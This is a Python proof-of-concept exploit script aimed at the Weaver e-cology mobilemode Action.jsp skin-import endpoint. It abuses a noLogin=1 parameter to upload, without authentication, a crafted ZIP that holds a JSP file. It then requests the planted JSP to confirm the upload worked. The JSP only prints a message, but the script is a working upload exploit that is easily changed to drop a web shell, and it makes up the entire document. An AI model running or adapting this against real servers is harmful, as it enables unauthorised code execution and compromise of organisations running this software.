'''
python weaver_mobilemode.Action.jsp_upload.py baseurl
'''

import requests, urllib3, sys
import random, io, zipfile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

rand4 = str(random.randint(1000, 9999))
filename = 'hacktest' + rand4

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Type': 'multipart/form-data; boundary=--------1c4ab976651c8a18',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52'
}

def scan(baseurl):
    # 创建一个BytesIO对象，用于在内存中读写二进制数据，模拟磁盘操作
    filedata = io.BytesIO()

    # 创建ZipFile对象，mode='w'表示写模式
    with zipfile.ZipFile(filedata, mode='w', compression=zipfile.ZIP_DEFLATED) as zipf:
        # 向zip文件中添加文件夹和文件
        zipf.writestr('images/1.png','')
        zipf.writestr('_.css', 'test')
        zipf.writestr('_.xml', f'''<?xml version="1.0" encoding="UTF-8"?>
            <skin>
                <id>C99ABD76E1D00001197FF651E7E5{rand4}</id>
                <name>11</name>
                <order>1</order>
                <subCompanyId />
                <previewImg><![CDATA[data:image/jpeg;base64]]></previewImg>
                <isEnabled />
            </skin>''')
        zipf.writestr(f'{filename}.jsp', '<% out.println("hello, you are hacked!");%>')

    # 设置请求的路径、Cookie信息和文件数据
    path = 'mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.skin.SkinAction&action=import&noLogin=1'
    cookies = {'JSESSIONID': 'abcTWLwhYah-keLpHtnEy','ecology_JSessionid':'abcTWLwhYah-keLpHtnEy'}
    data = (
        '----------1c4ab976651c8a18\r\n'
        'Content-Disposition: form-data; name="file"; filename="test.zip"\r\n'
        'Content-Type: image/png\r\n'
        '\r\n' + 
        filedata.getvalue().decode('latin1') + '\r\n'
        '----------1c4ab976651c8a18--\r\n')

    # 发送POST请求并获取响应
    response = requests.post(baseurl + path, cookies=cookies, headers=headers, data=data.encode('latin1'), verify=False, timeout=8)

    # # 检查响应状态码并打印结果
    url=baseurl+f'mobilemode/skin/C99ABD76E1D00001197FF651E7E5{rand4}/{filename}.jsp'
    response=requests.get(url=url, verify=False, timeout=15)

    if response.status_code == 200 and response.content != b'\n\n\n\n':
        print(f'[+] file upload ok, {url}')
        return
    else:
        print('[!] file upload fail')


url = sys.argv[1]
url = url if url[-1]=='/' else url+'/'
scan(url)
